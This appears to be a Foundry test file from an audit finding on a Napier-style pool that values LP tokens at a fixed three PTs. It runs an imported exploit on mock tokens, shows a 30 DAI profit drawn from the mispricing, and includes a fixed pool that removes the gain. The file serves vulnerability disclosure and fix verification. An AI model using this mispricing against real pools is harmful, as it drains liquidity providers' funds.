// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    MockERC20,
    CurveTricrypto,
    PtIssuer,
    PoolMath,
    PoolState
} from "./30577-h-3-lp-tokens-always-valued-at-3-pts-sherlock-napier-git.sol";

/// Same swap as NapierPool, priced off the live PT basket instead of `* 3`.
/// basket / supply == N_COINS * get_virtual_price / 1e18.
contract NapierPoolFixed {
    MockERC20 public immutable underlying;
    CurveTricrypto public immutable tricrypto;
    uint256 public totalUnderlying;
    uint256 public lastQuotedIn;

    constructor(MockERC20 _underlying, CurveTricrypto _tricrypto) {
        underlying = _underlying;
        tricrypto = _tricrypto;
    }

    function quote(uint256 baseLptOut) public view returns (uint256) {
        return baseLptOut * tricrypto.basket() / tricrypto.totalSupply();
    }

    function swapUnderlyingForExactBaseLpToken(uint256 baseLptOut, address recipient)
        external
        returns (uint256 underlyingIn)
    {
        underlyingIn = quote(baseLptOut);
        require(tricrypto.balanceOf(address(this)) >= baseLptOut, "lp");
        lastQuotedIn = underlyingIn;
        totalUnderlying += underlyingIn;
        underlying.transferFrom(msg.sender, address(this), underlyingIn);
        tricrypto.transfer(recipient, baseLptOut);
    }
}

contract Finding30577Test is Test {
    uint256 internal constant PT_EACH = 200e18;
    uint256 internal constant LP_SUPPLY = 100e18;
    uint256 internal constant POOL_LP = 20e18;
    uint256 internal constant BUY = 10e18;
    uint256 internal constant FAIR = 60e18;
    uint256 internal constant BUGGY = 30e18;
    uint256 internal constant TRUE_BEFORE = 120e18;

    function test_frozen_three_extracts_thirty_dai() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("virtual price", e.virtualPrice());
        emit log_named_uint("fair DAI", e.fairIn());
        emit log_named_uint("buggy DAI", e.quotedIn());
        emit log_named_uint("profit DAI", e.profit());
        emit log_named_uint("PT redeemed", e.ptRedeemed());
        emit log_named_uint("pool true before", e.poolValueBefore());
        emit log_named_uint("pool true after", e.poolValueAfter());
        emit log_named_uint("book before", e.bookBefore());
        emit log_named_uint("book after", e.bookAfter());

        assertEq(e.BUY(), BUY, "same trade size");
        assertEq(e.virtualPrice(), 2e18, "virtual price doubled");
        assertEq(e.fairIn(), FAIR, "10 LP is 60 DAI of PT");
        assertEq(e.quotedIn(), BUGGY, "frozen 3 charges 30 DAI");
        assertEq(e.ptRedeemed(), FAIR, "redeemed 60 PT");
        assertEq(e.profit(), FAIR - BUGGY, "profit is the mispricing");
        assertEq(e.profit(), 30e18, "extracted 30 DAI");
        assertEq(e.underlying().balanceOf(address(e)), e.CAPITAL() + e.profit(), "ends with 60 DAI");
        assertEq(e.poolDaiAfter(), BUGGY, "pool received 30 DAI");
        assertEq(e.poolValueBefore(), TRUE_BEFORE, "pool was worth 120 DAI");
        assertEq(e.poolValueAfter(), 90e18, "pool is worth 90 DAI");
        assertEq(e.poolValueBefore() - e.poolValueAfter(), e.profit(), "solvency gap equals profit");
        assertEq(e.bookBefore(), e.bookAfter(), "books still say 60 DAI");
        assertEq(e.bookAfter(), 60e18, "book value");
        assertGt(e.poolValueBefore(), e.bookBefore(), "true value was already above the frozen books");
    }

    function test_control_real_pt_balance_cancels_extraction() public {
        (MockERC20 dai, MockERC20 pt1, MockERC20 pt2, MockERC20 pt3, CurveTricrypto curve, PtIssuer issuer) = _curve();

        NapierPoolFixed pool = new NapierPoolFixed(dai, curve);
        curve.transfer(address(pool), POOL_LP);

        PoolMath math = new PoolMath();
        PoolState memory state = PoolState({
            totalBaseLptTimesN: POOL_LP * 3,
            totalUnderlying18: 0,
            scalarRoot: 0,
            maturity: 0,
            lnFeeRateRoot: 0,
            protocolFeePercent: 0,
            lastLnImpliedRate: 0
        });
        (uint256 buggy,,) = math.swapUnderlyingForExactBaseLpToken(state, BUY);
        uint256 fair = pool.quote(BUY);
        uint256 fromVp = BUY * 3 * curve.get_virtual_price() / 1e18;

        emit log_named_uint("control virtual price", curve.get_virtual_price());
        emit log_named_uint("control buggy DAI", buggy);
        emit log_named_uint("control fair DAI", fair);

        assertEq(curve.get_virtual_price(), 2e18, "same doubled basket");
        assertEq(buggy, BUGGY, "PoolMath still says 30");
        assertEq(fair, FAIR, "real PT basket says 60");
        assertEq(fair, fromVp, "basket matches N_COINS * virtual price");
        assertGt(fair, buggy, "the frozen 3 is short");

        uint256 trueBefore = curve.balanceOf(address(pool)) * curve.basket() / curve.totalSupply();
        assertEq(trueBefore, TRUE_BEFORE, "pool holds 120 DAI of PT");

        dai.mint(address(this), FAIR);
        uint256 start = dai.balanceOf(address(this));
        dai.approve(address(pool), fair);
        uint256 paid = pool.swapUnderlyingForExactBaseLpToken(BUY, address(this));
        assertEq(paid, FAIR, "charged the real PT value");

        (uint256 a, uint256 b, uint256 c) = curve.remove_liquidity(BUY, address(this));
        assertEq(a + b + c, FAIR, "redeemed 60 PT");
        pt1.approve(address(issuer), a);
        pt2.approve(address(issuer), b);
        pt3.approve(address(issuer), c);
        issuer.redeemBasket(a, b, c);

        uint256 trueAfter = curve.balanceOf(address(pool)) * curve.basket() / curve.totalSupply()
            + dai.balanceOf(address(pool));

        emit log_named_uint("control paid DAI", paid);
        emit log_named_uint("control end DAI", dai.balanceOf(address(this)));
        emit log_named_uint("control pool true after", trueAfter);

        assertEq(dai.balanceOf(address(this)), start, "extraction disappears");
        assertEq(dai.balanceOf(address(this)) - start, 0, "profit is zero");
        assertEq(pool.lastQuotedIn(), FAIR, "quote stayed on the basket");
        assertEq(trueAfter, trueBefore, "pool true value is unchanged");
        assertEq(dai.balanceOf(address(pool)), FAIR, "pool received the 60 DAI the LP was worth");
    }

    function _curve()
        internal
        returns (MockERC20 dai, MockERC20 pt1, MockERC20 pt2, MockERC20 pt3, CurveTricrypto curve, PtIssuer issuer)
    {
        dai = new MockERC20("Dai Stablecoin", "DAI", 18);
        pt1 = new MockERC20("Principal Token 1", "PT1", 18);
        pt2 = new MockERC20("Principal Token 2", "PT2", 18);
        pt3 = new MockERC20("Principal Token 3", "PT3", 18);
        curve = new CurveTricrypto(pt1, pt2, pt3);
        issuer = new PtIssuer(dai, pt1, pt2, pt3);
        pt1.mint(address(curve), PT_EACH);
        pt2.mint(address(curve), PT_EACH);
        pt3.mint(address(curve), PT_EACH);
        curve.mint(address(this), LP_SUPPLY);
        dai.mint(address(issuer), FAIR);
    }
}
